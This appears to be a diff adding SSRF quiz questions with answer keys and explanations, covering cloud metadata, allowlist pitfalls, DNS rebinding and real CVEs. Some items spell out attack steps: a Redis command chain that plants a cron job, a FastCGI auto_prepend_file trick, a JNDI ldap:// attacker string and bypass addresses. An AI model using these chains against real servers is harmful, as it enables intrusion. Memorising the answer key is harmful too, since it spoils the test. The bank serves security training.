@@ -938,3 +938,587 @@ questions:
     write files (cron entries, SSH keys, webshells), turning SSRF into remote code
     execution on the host.
   ref: concepts.md#dangerous-url-schemes-and-protocol-smuggling
+- id: ssrf-and-server-side-request-attacks-051
+  difficulty: advanced
+  tags:
+  - cve
+  - proxylogon
+  - authentication-bypass
+  question: |
+    ProxyLogon (CVE-2021-26855) is frequently cited as a landmark SSRF. What made it
+    especially severe compared to a typical credential-stealing SSRF?
+  options:
+  - It was a pre-auth SSRF that made the Exchange front-end issue back-end requests as the server itself,
+    effectively authenticating as the machine account
+  - It leaked the TLS private key of the Exchange server
+  - It only worked against on-premises Active Directory forests
+  - It required a valid mailbox login before it could be triggered
+  answer: 0
+  explanation: |
+    CVE-2021-26855 was an unauthenticated SSRF: a crafted /autodiscover request with a malicious
+    X-BEResource cookie made the client-access front-end forward an attacker-controlled request
+    to the back-end as the Exchange server, bypassing authentication. Chained with CVE-2021-27065
+    (arbitrary file write) it produced RCE across tens of thousands of servers.
+  ref: concepts.md#real-world-ssrf-cves-and-incidents
+- id: ssrf-and-server-side-request-attacks-052
+  difficulty: advanced
+  tags:
+  - cve
+  - capital-one
+  - imdsv2
+  question: |
+    In the Capital One (2019) breach, an SSRF reached IMDSv1 and stole IAM credentials. Would
+    enforcing IMDSv2 (HttpTokens=required, hop-limit 1) most likely have prevented it, and why?
+  options:
+  - No, because IMDSv2 exposes the same credentials over the same GET
+  - No, because IMDSv2 only encrypts the response but still answers plain GETs
+  - Yes, because the simple GET could not perform the PUT+token handshake, and hop-limit/XFF-rejection
+    would block the proxied path
+  - Yes, because IMDSv2 removes IAM role credentials from the metadata service entirely
+  answer: 2
+  explanation: |
+    The attack used a plain GET through a proxy. IMDSv2 requires a PUT to obtain a token plus a
+    custom token header on each GET, defaults to hop-limit 1, and rejects PUTs carrying
+    X-Forwarded-For — all of which defeat that GET-through-a-proxy primitive. IMDSv2 still serves
+    credentials, but only to a properly authenticated local caller.
+  ref: concepts.md#real-world-ssrf-cves-and-incidents
+- id: ssrf-and-server-side-request-attacks-053
+  difficulty: intermediate
+  tags:
+  - cve
+  - gitlab
+  - features
+  question: |
+    GitLab CVE-2021-22214 was an unauthenticated SSRF. Which feature pattern introduced it?
+  options:
+  - A CI/CD feature that fetched a remote .gitlab-ci.yml by URL (project import / ci lint)
+  - A password reset email template
+  - A Markdown renderer that executed embedded JavaScript
+  - A webhook signature verification routine
+  answer: 0
+  explanation: |
+    The vulnerability lived in a "fetch a remote CI config by URL" path (import / ci/lint), the
+    classic fetch-a-URL feature. Because it was reachable unauthenticated, an attacker could make
+    the GitLab server issue arbitrary internal requests, including to metadata.
+  ref: concepts.md#real-world-ssrf-cves-and-incidents
+- id: ssrf-and-server-side-request-attacks-054
+  difficulty: advanced
+  tags:
+  - gcp
+  - metadata
+  - bypass
+  question: |
+    An SSRF against GCP metadata cannot set custom request headers. Which historical detail
+    could still let it read metadata without the Metadata-Flavor: Google header?
+  options:
+  - The computeMetadata/v1/ endpoint accepts a ?noheader=true query parameter
+  - GCP metadata never required any header on any endpoint
+  - Adding a trailing dot to metadata.google.internal disables header enforcement
+  - The legacy v0.1/ and v1beta1/ endpoints did not enforce the Metadata-Flavor header (now deprecated/disabled)
+  answer: 3
+  explanation: |
+    Header enforcement on GCP is version-specific: only computeMetadata/v1/ requires
+    Metadata-Flavor: Google. The older v0.1/ and v1beta1/ endpoints historically served metadata
+    without that header — a real SSRF footgun until they were deprecated/disabled.
+  ref: concepts.md#gcp-and-azure-metadata-specifics
+- id: ssrf-and-server-side-request-attacks-055
+  difficulty: advanced
+  tags:
+  - azure
+  - metadata
+  - headers
+  question: |
+    Which combination of requirements does Azure's Instance Metadata Service enforce, mirroring
+    several IMDSv2 protections?
+  options:
+  - A Metadata: true header, an api-version query parameter, and rejection of requests carrying X-Forwarded-For
+  - An Authorization Bearer token and mutual TLS
+  - A CAPTCHA challenge and a session cookie
+  - Only that the request originate from a public IP
+  answer: 0
+  explanation: |
+    Azure IMDS requires the header Metadata: true (missing it yields 400 "Required metadata header
+    not specified"), an api-version query parameter, and it rejects any request carrying
+    X-Forwarded-For — plus it must bypass proxies. These parallel IMDSv2's header/XFF defenses.
+  ref: concepts.md#gcp-and-azure-metadata-specifics
+- id: ssrf-and-server-side-request-attacks-056
+  difficulty: advanced
+  tags:
+  - open-redirect
+  - bypass
+  - scenario
+  question: |
+    A fetcher allowlists the host, resolves and pins the IP (public), and rejects private ranges,
+    but still follows redirects. An attacker submits https://trusted.example/go?next=http://169.254.169.254/.
+    Why does this succeed?
+  options:
+  - The pinned IP check is bypassed by the query string
+  - The AAAA record of trusted.example points to metadata
+  - Pinning the IP disables TLS certificate validation
+  - trusted.example has an open redirect; host validation and the IP check pass, then the app follows the
+    redirect internally to metadata
+  answer: 3
+  explanation: |
+    This is open-redirect chaining, distinct from generic redirect-following: the submitted host
+    is genuinely allowlisted and public, so host and IP checks pass. The trusted host's own open
+    redirect then sends the client to the internal target. Fix: don't auto-follow (or re-validate
+    each hop) AND fix the open redirect.
+  ref: concepts.md#open-redirect-chaining-and-hidden-input-vectors
+- id: ssrf-and-server-side-request-attacks-057
+  difficulty: advanced
+  tags:
+  - hidden-vectors
+  - referer
+  question: |
+    A security review found no user-facing "url" field, yet the app is SSRF-vulnerable. Which
+    commonly overlooked input does an analytics/link-preview backend often fetch?
+  options:
+  - The Content-Length header
+  - The TLS cipher suite
+  - The Accept-Language header
+  - The value of the Referer header
+  answer: 3
+  explanation: |
+    Analytics and link-preview backends frequently fetch the URL in the Referer header (e.g. to
+    generate a thumbnail of the referring page). PortSwigger explicitly flags Referer, along with
+    Host/X-Forwarded-Host, as hidden SSRF attack surface beyond an obvious url parameter.
+  ref: concepts.md#open-redirect-chaining-and-hidden-input-vectors
+- id: ssrf-and-server-side-request-attacks-058
+  difficulty: expert
+  tags:
+  - blind
+  - oob
+  - egress
+  question: |
+    During blind SSRF testing you receive a DNS lookup on your OAST listener but no HTTP callback.
+    What is the most accurate conclusion and next step?
+  options:
+  - DNS egress is open but outbound HTTP is blocked by network filtering; pivot to internal-only OOB payloads
+    or exploit the server's own HTTP client
+  - The target is not vulnerable at all; stop testing
+  - The HTTP callback was lost to caching; simply retry the same payload
+  - The server resolved but the vulnerability is actually XSS
+  answer: 0
+  explanation: |
+    A DNS hit proves the sink fires and resolves your name, but a missing HTTP hit indicates HTTP
+    egress is filtered. That distinguishes "vulnerable but egress-controlled" from "fully
+    exploitable." Next: target internal services directly, or exploit a bug in the server's own
+    HTTP client/parser (client-side exploitation).
+  ref: concepts.md#blind-ssrf-weaponization-and-client-side-exploitation
+- id: ssrf-and-server-side-request-attacks-059
+  difficulty: expert
+  tags:
+  - blind
+  - port-scan
+  - oracle
+  question: |
+    You have a semi-blind SSRF with no response body. Which timing pattern most reliably indicates
+    a firewalled/filtered internal port versus a closed one?
+  options:
+  - Closed and filtered ports both return instantly with identical timing
+  - A filtered port responds faster than a closed port
+  - A closed port returns fast (connection refused); a filtered port hangs and then times out (slow)
+  - Timing carries no information without the response body
+  answer: 2
+  explanation: |
+    A closed port returns "connection refused" almost immediately (fast), while a firewalled/
+    filtered port silently drops packets, so the connection hangs until timeout (slow). Open ports
+    return a response (medium). This three-way timing split is the classic semi-blind port-scan
+    oracle, augmented by status-code/length/error differentials.
+  ref: concepts.md#blind-ssrf-weaponization-and-client-side-exploitation
+- id: ssrf-and-server-side-request-attacks-060
+  difficulty: expert
+  tags:
+  - blind
+  - client-side
+  - cracking-the-lens
+  question: |
+    "Cracking the Lens"-style exploitation of blind SSRF turns a non-reflecting SSRF into potential
+    compromise by doing what?
+  options:
+  - Brute-forcing the internal service's password over the SSRF channel
+  - Reflecting the response body through a second endpoint
+  - Using the SSRF to send phishing emails
+  - Making the server connect to an attacker server that returns a malicious response exploiting a bug in
+    the server's own HTTP client/parser
+  answer: 3
+  explanation: |
+    Instead of relying on reaching internal services, the attacker forces the server to fetch an
+    attacker-controlled URL whose response exploits a vulnerability in the server's HTTP client or
+    parser (oversized headers, decompression bombs, deserialization). This can yield RCE with zero
+    response reflection.
+  ref: concepts.md#blind-ssrf-weaponization-and-client-side-exploitation
+- id: ssrf-and-server-side-request-attacks-061
+  difficulty: expert
+  tags:
+  - schemes
+  - jndi
+  - log4shell
+  question: |
+    An SSRF/URL value flows into a Java JNDI lookup. Which scheme turns this into the Log4Shell-class
+    remote-code-execution primitive?
+  options:
+  - dict://
+  - tftp://
+  - ldap:// (JNDI lookup returning a remote/serialized payload)
+  - data:
+  answer: 2
+  explanation: |
+    ldap:// (and rmi://) fed to a JNDI lookup causes the JVM to fetch and instantiate a remote
+    object/serialized payload — the Log4Shell mechanism (jndi:ldap://attacker/Exploit). It bridges
+    SSRF/URL-fetch to JNDI-injection RCE.
+  ref: concepts.md#more-dangerous-schemes-and-crlf-protocol-injection
+- id: ssrf-and-server-side-request-attacks-062
+  difficulty: expert
+  tags:
+  - schemes
+  - phar
+  - deserialization
+  question: |
+    Why is the PHP phar:// scheme dangerous as an SSRF/file-path primitive?
+  options:
+  - It encrypts the archive so filters cannot inspect it
+  - It forces the response to be served over HTTPS
+  - Reading a Phar archive's metadata triggers PHP object deserialization, reachable via a POP gadget chain
+    to RCE
+  - It disables PHP's open_basedir restriction
+  answer: 2
+  explanation: |
+    When a filesystem-style operation touches a phar:// path, PHP deserializes the archive's
+    serialized metadata. If a suitable POP (property-oriented programming) gadget chain exists in
+    loaded classes, that deserialization can escalate to code execution.
+  ref: concepts.md#more-dangerous-schemes-and-crlf-protocol-injection
+- id: ssrf-and-server-side-request-attacks-063
+  difficulty: expert
+  tags:
+  - crlf
+  - smuggling
+  - scenario
+  question: |
+    An interviewer says: "gopher:// is disabled and only http/https are allowed. Can SSRF still
+    reach an internal Redis?" What is the best answer?
+  options:
+  - No, disabling gopher fully prevents reaching any non-HTTP text protocol
+  - Yes, but only if Redis is exposed on a public IP
+  - No, because Redis rejects any bytes that begin with an HTTP method
+  - Yes, via CRLF (%0d%0a) injection in the URL smuggling commands into a tolerant text protocol, or a
+    redirect to dict:// if that scheme is enabled
+  answer: 3
+  explanation: |
+    Even without gopher, CRLF injection in the outbound URL can inject additional lines/commands
+    that a lenient text protocol like Redis will parse despite the HTTP preamble; a redirect to
+    dict:// (if enabled) is another path. "Gopher off" does not prove Redis is safe — pin the IP
+    and block egress.
+  ref: concepts.md#more-dangerous-schemes-and-crlf-protocol-injection
+- id: ssrf-and-server-side-request-attacks-064
+  difficulty: expert
+  tags:
+  - gopher
+  - redis
+  - rce
+  question: |
+    Walk through gopher-to-RCE via unauthenticated Redis. Which sequence of Redis commands plants
+    a cron job on disk?
+  options:
+  - AUTH default; then KEYS *; then FLUSHALL
+  - CONFIG GET dir; then INFO; then CLIENT LIST
+  - CONFIG SET dir /var/spool/cron/; CONFIG SET dbfilename root; SET x "<cron payload>"; SAVE
+  - SUBSCRIBE cron; PUBLISH cron "<payload>"; QUIT
+  answer: 2
+  explanation: |
+    The classic chain repoints Redis's working directory to the cron spool, names the DB file
+    after a crontab (root), stores a key whose value is a cron line, then SAVE flushes the RDB to
+    /var/spool/cron/root, which cron parses and runs. Variants write authorized_keys or a webshell.
+  ref: concepts.md#gopher-to-rce-concrete-exploit-steps
+- id: ssrf-and-server-side-request-attacks-065
+  difficulty: expert
+  tags:
+  - gopher
+  - fastcgi
+  - rce
+  question: |
+    In the gopher-to-FastCGI (PHP-FPM) RCE chain, which FastCGI parameter is abused to execute
+    attacker-supplied PHP from the request body?
+  options:
+  - SCRIPT_NAME set to /etc/passwd
+  - PHP_VALUE set to auto_prepend_file = php://input (with allow_url_include on)
+  - REMOTE_ADDR set to 127.0.0.1
+  - QUERY_STRING set to a base64 blob
+  answer: 1
+  explanation: |
+    Speaking FastCGI over gopher to a local FPM socket, the attacker sets PHP_VALUE to
+    auto_prepend_file = php://input (plus allow_url_include=On) so FPM prepends and executes the
+    PHP source sent in the request body — reaching RCE with no web server routing to the script.
+  ref: concepts.md#gopher-to-rce-concrete-exploit-steps
+- id: ssrf-and-server-side-request-attacks-066
+  difficulty: expert
+  tags:
+  - dns-rebinding
+  - happy-eyeballs
+  - defense
+  question: |
+    A fetcher validates and pins the first resolved IPv4 address, but the HTTP client uses Happy
+    Eyeballs (RFC 8305). Why can this still be rebound to an internal host?
+  options:
+  - Happy Eyeballs disables DNS caching entirely
+  - Happy Eyeballs races A and AAAA connections in parallel, so an unvalidated AAAA (IPv6) address can win
+    the race to an internal target
+  - RFC 8305 requires re-resolving every 100ms
+  - IPv6 addresses cannot be private, so there is no risk
+  answer: 1
+  explanation: |
+    Happy Eyeballs opens IPv4 and IPv6 connections concurrently and uses whichever succeeds first.
+    Validating only the IPv4 (A) address leaves the AAAA path unchecked; a malicious internal IPv6
+    can win the race. Correct pinning validates all A and AAAA addresses before connecting.
+  ref: concepts.md#dns-rebinding-defense-implementation-traps
+- id: ssrf-and-server-side-request-attacks-067
+  difficulty: expert
+  tags:
+  - dns-rebinding
+  - pinning
+  - tls
+  question: |
+    You pin the validated IP and connect to that literal IP so DNS can't rebind. What must you also
+    do so HTTPS to the original hostname still works correctly?
+  options:
+  - Disable certificate verification for the connection
+  - Downgrade the connection to HTTP
+  - Add the pinned IP to the certificate's SAN list
+  - Set the Host header and TLS SNI to the original hostname while connecting to the pinned IP
+  answer: 3
+  explanation: |
+    Connecting to a literal IP would break SNI-based routing and certificate hostname validation.
+    The fix is to connect to the pinned IP but present the original hostname as the TLS SNI and in
+    the Host header, so certificate validation and virtual-host routing still function.
+  ref: concepts.md#dns-rebinding-defense-implementation-traps
+- id: ssrf-and-server-side-request-attacks-068
+  difficulty: advanced
+  tags:
+  - dns-rebinding
+  - redirects
+  - pinning
+  question: |
+    Why must IP pinning be re-applied on every HTTP redirect hop rather than only on the first
+    request?
+  options:
+  - Each redirect is a new request whose host the client may re-resolve, losing the original pin and allowing
+    rebinding to an internal IP
+  - Redirects always downgrade to HTTP
+  - The pin expires after exactly one second
+  - Redirect responses cannot carry a Location header
+  answer: 0
+  explanation: |
+    A redirect hop is a fresh connection to a possibly different host; if the client re-resolves
+    that host, the earlier pin no longer protects it and rebinding/internal targeting becomes
+    possible again. Re-pin (resolve, validate, connect-by-IP) each hop, or don't follow redirects.
+  ref: concepts.md#dns-rebinding-defense-implementation-traps
+- id: ssrf-and-server-side-request-attacks-069
+  difficulty: expert
+  tags:
+  - allowlist
+  - suffix-confusion
+  - defense
+  question: |
+    A host allowlist accepts any host that contains the substring "good.example". Which
+    attacker-registered host bypasses it, and what is the correct fix?
+  options:
+  - good.example.attacker.com (a domain the attacker controls that embeds the allowlisted string); fix by
+    matching the exact parsed host, not a substring
+  - api.good.example, which is a legitimate subdomain
+  - good.example itself
+  - 8.8.8.8, an unrelated public IP
+  answer: 0
+  explanation: |
+    A substring/contains test is the wrong check: good.example.attacker.com contains
+    "good.example" yet the true registrable domain is attacker.com, which the attacker owns.
+    (An endsWith test is similarly bypassed by evilgood.example.) Compare the exact parsed
+    host and port against the allowlist instead of doing substring matching.
+  ref: concepts.md#allowlist-correctness-pitfalls
+- id: ssrf-and-server-side-request-attacks-070
+  difficulty: advanced
+  tags:
+  - allowlist
+  - port
+  - defense
+  question: |
+    An allowlist validates only the host (good.example) and pins the resolved IP, but does not
+    check the port. How can this still be abused?
+  options:
+  - It cannot; host validation is sufficient
+  - The attacker changes the TLS version
+  - The attacker adds a fragment to the URL
+  - The attacker uses good.example:6379 (or another port) to target a different internal service on the
+    allowlisted host/IP
+  answer: 3
+  explanation: |
+    If the allowlisted host also runs other services (or co-locates with them), specifying a
+    different port such as :6379 reaches Redis or another daemon. Validate scheme, host, AND port
+    against the allowlist, not the host alone.
+  ref: concepts.md#allowlist-correctness-pitfalls
+- id: ssrf-and-server-side-request-attacks-071
+  difficulty: expert
+  tags:
+  - allowlist
+  - homoglyph
+  - punycode
+  question: |
+    Which allowlist pitfall does the host "gооd.example" (with Cyrillic о characters) exploit, and
+    what is the correct countermeasure?
+  options:
+  - A case-sensitivity bug; fix by uppercasing the host
+  - A trailing-dot bug; fix by stripping the dot
+  - A unicode/homoglyph (IDN) bug; normalize to punycode before comparing against the allowlist
+  - A port bug; fix by pinning port 443
+  answer: 2
+  explanation: |
+    Cyrillic homoglyphs render like Latin letters but are different code points, so the string
+    won't match a Latin allowlist entry (and can be registered by an attacker). Normalize
+    internationalized names to punycode (ASCII) before comparison to neutralize homoglyph tricks.
+  ref: concepts.md#allowlist-correctness-pitfalls
+- id: ssrf-and-server-side-request-attacks-072
+  difficulty: expert
+  tags:
+  - imdsv2
+  - hop-limit
+  - containers
+  question: |
+    Why is HttpPutResponseHopLimit sometimes set to 2, and what is the security tension this creates?
+  options:
+  - 2 is required for IPv6 metadata; it has no security impact
+  - 2 doubles the token TTL, weakening expiry
+  - 2 disables the token requirement entirely
+  - Containers legitimately need hop-limit 2 to reach IMDS through the container network bridge, but 2 re-opens
+    the "SSRF via an extra hop / reverse proxy" path that a limit of 1 closes
+  answer: 3
+  explanation: |
+    Containerized workloads traverse an extra network hop (the bridge) to reach IMDS, so operators
+    raise the hop limit to 2. But that same extra hop is exactly what SSRF-through-a-proxy needs,
+    so hop-limit 2 weakens the defense that hop-limit 1 provided. Mitigate by restricting the
+    metadata endpoint to the intended local process via host firewall rules.
+  ref: concepts.md#imdsv2-residual-risk-and-the-hop-limit-tension
+- id: ssrf-and-server-side-request-attacks-073
+  difficulty: expert
+  tags:
+  - imdsv2
+  - residual-risk
+  - scenario
+  question: |
+    "IMDSv2 is enforced and hop-limit is 1 — are we safe from SSRF credential theft?" What is the
+    most accurate senior answer?
+  options:
+  - Yes, IMDSv2 with hop-limit 1 fully eliminates SSRF credential theft
+  - 'Not necessarily: an SSRF that can set headers and do a PUT, request smuggling, or a container with
+    hop-limit 2 can still reach it — so fix the SSRF, block egress to 169.254.169.254, and scope IAM'
+  - Yes, provided the instance also uses IPv6
+  - No, because IMDSv2 does not serve IAM credentials at all
+  answer: 1
+  explanation: |
+    IMDSv2 is defense in depth, not a fix. Full-request-forgery primitives (arbitrary headers +
+    PUT), request smuggling, or a legitimately-raised hop limit can still reach it, and non-IMDS
+    targets remain. The complete answer fixes the SSRF, blocks metadata egress, and applies
+    least-privilege IAM.
+  ref: concepts.md#imdsv2-residual-risk-and-the-hop-limit-tension
+- id: ssrf-and-server-side-request-attacks-074
+  difficulty: advanced
+  tags:
+  - asvs
+  - standards
+  - defense
+  question: |
+    Which OWASP ASVS v4 requirement most directly governs an application's SSRF protection for
+    outbound URL fetches?
+  options:
+  - ASVS section 2.1 (password security)
+  - ASVS section 9.1 (client communication security)
+  - ASVS section 4.1 (general access control)
+  - 'ASVS section 12.6 (SSRF protection: restrict outbound requests to allowlisted destinations and do
+    not follow redirects to untrusted hosts)'
+  answer: 3
+  explanation: |
+    ASVS v4 section 12.6 defines SSRF Protection Requirements — outbound requests limited to
+    allowlisted destinations and not following redirects to untrusted hosts — complemented by
+    section 5.2.6 on validating untrusted data used in a URL fetch. WSTG-INPV-19 is the matching
+    test procedure.
+  ref: concepts.md#standards-and-control-references
+- id: ssrf-and-server-side-request-attacks-075
+  difficulty: advanced
+  tags:
+  - standards
+  - rfc
+  - ip-validation
+  question: |
+    When implementing the numeric resolved-IP range check, which RFC-defined range is most commonly
+    forgotten and lets SSRF reach cloud NAT-shared address space?
+  options:
+  - RFC 1918 private ranges (10/8, 172.16/12, 192.168/16)
+  - RFC 3927 link-local 169.254.0.0/16
+  - RFC 6598 carrier-grade NAT 100.64.0.0/10
+  - RFC 4291 IPv6 loopback ::1
+  answer: 2
+  explanation: |
+    RFC 6598's 100.64.0.0/10 (CGNAT / shared address space) is frequently omitted from denylists
+    that remember loopback, link-local, and RFC 1918, yet it can front internal infrastructure in
+    some environments. A robust check covers RFC 1918, 3927, 6598, and IPv6 (RFC 4291) ranges,
+    including IPv4-mapped forms.
+  ref: concepts.md#standards-and-control-references
+- id: ssrf-and-server-side-request-attacks-076
+  difficulty: advanced
+  tags:
+  - bypass
+  - 0.0.0.0
+  - localhost
+  question: |
+    A filter blocks 127.0.0.1 and "localhost" but a service is bound to 0.0.0.0:8080. Which address
+    reaches that service and defeats the filter (the "0.0.0.0-day" issue)?
+  options:
+  - http://0.0.0.0:8080/ (and [::] ), which routes to a service listening on all interfaces
+  - http://example.com:8080/
+  - http://256.0.0.0:8080/
+  - http://8.8.8.8:8080/
+  answer: 0
+  explanation: |
+    A service bound to 0.0.0.0 listens on all interfaces, so it is reachable via 0.0.0.0, [::], or
+    127.0.0.1. A denylist that only blocks 127.0.0.1/localhost misses 0.0.0.0 and [::] — the
+    "0.0.0.0-day" bypass. Validate the resolved numeric IP against all loopback/unspecified ranges,
+    including 0.0.0.0/8.
+  ref: concepts.md#bypasses-ip-encodings-and-address-tricks
+- id: ssrf-and-server-side-request-attacks-077
+  difficulty: advanced
+  tags:
+  - scenario
+  - defense-review
+  - toctou
+  question: |
+    Given the pseudocode `ip = resolve(url); if ip.is_public(): fetch(url)`, which two flaws make
+    it exploitable and what is the correct fix?
+  options:
+  - It leaks memory and is slow; fix by caching DNS
+  - It only checks IPv4; fix by blocking all IPv6
+  - It has a DNS-rebinding TOCTOU (fetch re-resolves) and an open-redirect/redirect gap; fix by pinning the
+    validated IP and disabling or re-validating redirects
+  - It uses HTTP; fix by forcing HTTPS
+  answer: 2
+  explanation: |
+    resolve() then fetch(url) re-resolves at connect time (DNS rebinding TOCTOU), and fetch may
+    follow a redirect to an internal target that was never validated. The correct fix pins the
+    validated IP (connect to that literal IP) AND disables/re-validates redirects on every hop.
+  ref: concepts.md#dns-rebinding-defense-implementation-traps
+- id: ssrf-and-server-side-request-attacks-078
+  difficulty: advanced
+  tags:
+  - hidden-vectors
+  - host-header
+  question: |
+    Why can the Host or X-Forwarded-Host header be an SSRF sink in some applications?
+  options:
+  - Browsers send them automatically, so they are always trusted
+  - They are encrypted and cannot be inspected
+  - They only affect caching, never outbound requests
+  - Reverse proxies and "absolute URL" builders may use the header value to construct an outbound request
+    or route, letting an attacker steer where the server connects
+  answer: 3
+  explanation: |
+    Some apps and proxies build outbound URLs or routing decisions from the Host/X-Forwarded-Host
+    value (e.g. password-reset links, cache keys, internal routing). An attacker-controlled header
+    can then redirect where the server connects — an SSRF sink hidden in header handling.
+  ref: concepts.md#open-redirect-chaining-and-hidden-input-vectors
